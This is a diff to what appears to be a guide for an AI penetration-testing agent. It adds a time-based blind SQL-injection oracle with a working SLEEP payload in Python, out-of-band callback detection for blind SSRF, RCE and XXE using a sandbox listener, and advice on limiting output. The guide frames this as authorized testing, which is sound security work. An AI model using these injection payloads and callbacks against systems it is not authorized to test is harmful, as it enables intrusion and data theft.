@@ -79,6 +79,22 @@ print("RECOVERED:", val)
 ''', timeout_s=120)
 ```
 
+**Time-based oracle (when TRUE and FALSE are byte-identical).** If the two
+branches return the same body/status/length, fall back to a **timing** oracle:
+inject a conditional delay — `SLEEP(3)` (MySQL), `pg_sleep(3)` (Postgres),
+`WAITFOR DELAY '0:0:3'` (MSSQL) — gated on the condition, and make the oracle
+`r.elapsed.total_seconds() > 2`. Calibrate baseline latency first, pick a delay
+clearly above observed jitter, and **median 2-3 samples per probe** to survive
+network noise:
+
+```
+import requests, statistics
+def oracle(cond):
+    def t():
+        return requests.post(URL, data={"x": f"' AND IF(({cond}),SLEEP(3),0)-- "}).elapsed.total_seconds()
+    return statistics.median(t() for _ in range(3)) > 2   # delay 3s, threshold above jitter
+```
+
 ## Authenticated probing — use a Session
 
 For anything past the login wall, drive a `requests.Session` instead of bare
@@ -104,6 +120,25 @@ def get(p, **kw): return s.get(URL + p, timeout=10, **kw)
 - **Budget**: each call has its own `timeout_s` — give loops a realistic cap and
   print progress with `flush=True` so partial results survive a timeout.
 
+## Out-of-band (OOB) detection
+
+For **blind** SSRF / RCE / XXE where the response carries no signal, make the
+target call back to *you*. Start a listener in the sandbox in the background via
+`execute_bash` (e.g. `python -m http.server 8000`, or a raw socket listener),
+embed the sandbox's reachable address as the callback in the injected payload,
+send the probe, then read the server log / hit count to confirm the target
+reached out:
+
+```
+execute_bash(command="python -m http.server 8000 >/tmp/oob.log 2>&1 &", ...)
+# inject http://<sandbox-host>:8000/ping?<marker> as the SSRF/XXE/RCE callback, send the probe
+execute_bash(command="grep ping /tmp/oob.log")   # a hit == confirmed callback
+```
+
+Caveat: the target must be able to reach the sandbox host. If egress is one-way
+(target can't route back to you), fall back to a public interactsh-style
+collector and poll it instead.
+
 ## Reporting what a script found — REQUIRED
 
 The sandbox's HTTP happens *inside the container* (via `requests`/`curl`), so
@@ -126,5 +161,10 @@ yourself:
   dozen near-identical scripts (that's the same churn, just moved into the
   sandbox).
 - Don't re-run an identical script; build on what the previous call produced.
+- **Keep stdout small — it is fed back into the model's context.** Print only the
+  recovered value, decisive status/length deltas, and a final `RESULT:` line;
+  never dump full response bodies or large lists. Write bulk output (enumerated
+  IDs, full responses, wordlist results) to a file in the working directory
+  (saved as an artifact) and print just the path and a count.
 - Stay on the authorized target host. The sandbox is for testing the target, not
   the host it runs on.
